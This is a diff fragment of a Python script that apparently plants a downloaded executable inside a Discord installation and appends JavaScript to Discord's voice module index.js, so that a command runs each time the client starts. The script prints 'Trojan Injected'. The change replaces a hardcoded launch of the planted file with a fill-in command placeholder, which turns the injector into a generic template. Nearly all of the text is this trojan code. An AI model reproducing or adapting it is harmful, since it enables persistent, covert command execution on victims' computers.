@@ -31,7 +31,7 @@ if __name__ == "__main__":
         open(PATH + "\\modules\\discord_utils\\discord.exe",'w+').close()
         open(PATH + "\\modules\\discord_utils\\discord.exe", 'wb').write(r.content)
         with open(PATH+"\\modules\\discord_voice\\index.js", "a+") as f:
-            inj = "const { exec } = require(\'child_process\');const cmd = \"start \\\"\\\" \\\"%APPDATA%\\\\Discord\\\\0.0.309\\\\modules\\\\discord_utils\\\\discord.exe\";exec(cmd, (err, stdout, stderr) => {}); //hihi"
+            inj = "const { exec } = require(\'child_process\');const cmd = \"###YOUR COMMAND HERE###\"; exec(cmd, (err, stdout, stderr) => {}); //hihi"
             f.write(inj)
             print(Fore.CYAN + "> Trojan Injected")
             f.close()
